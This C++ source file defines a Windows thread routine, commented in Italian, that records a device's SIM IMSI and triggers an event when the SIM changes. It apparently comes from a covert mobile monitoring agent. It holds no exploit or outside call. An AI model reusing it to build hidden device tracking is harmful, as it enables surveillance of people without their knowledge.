#include "Event.h"
#include "Common.h"
#include "Conf.h"
#include "Date.h"
#include "Log.h"
#include "Observer.h"
#include "Device.h"

DWORD WINAPI OnSimChange(LPVOID lpParam) {
	Event *me = (Event *)lpParam;
	HANDLE eventHandle;
	wstring subType;
	Device *deviceObj = Device::self();
	Log log;
	WCHAR *pwMarkup = NULL;
	UINT uLen = 0;

	eventHandle = me->getEvent();

	me->setStatus(EVENT_RUNNING);

	DBG_TRACE(L"Debug - SimChange.cpp - SimChange event started\n", 5, FALSE);

	// Prendiamo l'IMSI attuale e mettiamolo in un markup
	if (deviceObj->GetImsi().size()) {
		// Scriviamo il markup soltanto se non esiste
		if (log.IsMarkup(EVENT_SIM_CHANGE) == FALSE) {
			if (log.WriteMarkup(EVENT_SIM_CHANGE, (BYTE *)deviceObj->GetImsi().c_str(), 
				deviceObj->GetImsi().size() * sizeof(WCHAR)) == FALSE) {
					me->setStatus(EVENT_STOPPED);
					DBG_TRACE(L"Debug - Events.cpp - SimChange [Cannot write markup]\n", 5, FALSE);
					return 0;
			}
		}
	}

	LOOP {
		pwMarkup = (WCHAR *)log.ReadMarkup(EVENT_SIM_CHANGE, &uLen);

		// Se non abbiamo un markup, creiamolo
		if (pwMarkup == NULL && deviceObj->GetImsi().size()) {
			log.WriteMarkup(EVENT_SIM_CHANGE, (BYTE *)deviceObj->GetImsi().c_str(), 
				deviceObj->GetImsi().size() * sizeof(WCHAR));

			pwMarkup = (WCHAR *)log.ReadMarkup(EVENT_SIM_CHANGE, &uLen);
		}

		// Se abbiamo letto l'IMSI ed esiste il markup, confrontiamo i dati
		if (deviceObj->GetImsi().size() && pwMarkup && uLen) {
			// Se i due markup sono diversi
			if (wcsicmp(deviceObj->GetImsi().c_str(), pwMarkup)) {
				me->triggerStart();

				// Aggiorna il markup
				log.WriteMarkup(EVENT_SIM_CHANGE, (BYTE *)deviceObj->GetImsi().c_str(), 
					deviceObj->GetImsi().size() * sizeof(WCHAR));
			}
		}

		if (pwMarkup) {
			delete[] pwMarkup;
			pwMarkup = NULL;
		}

		int delay;

		if (uLen)
			delay = INFINITE;
		else
			delay = 25000;

		// Only verify at boot time if a SIM card is inserted and unlocked
		WaitForSingleObject(eventHandle, delay);

		if (me->shouldStop()) {
			DBG_TRACE(L"Debug - Timer.cpp - SimChange Event is Closing\n", 1, FALSE);
			me->setStatus(EVENT_STOPPED);

			return 0;
		}
	}

	me->setStatus(EVENT_STOPPED);
	return 0;
}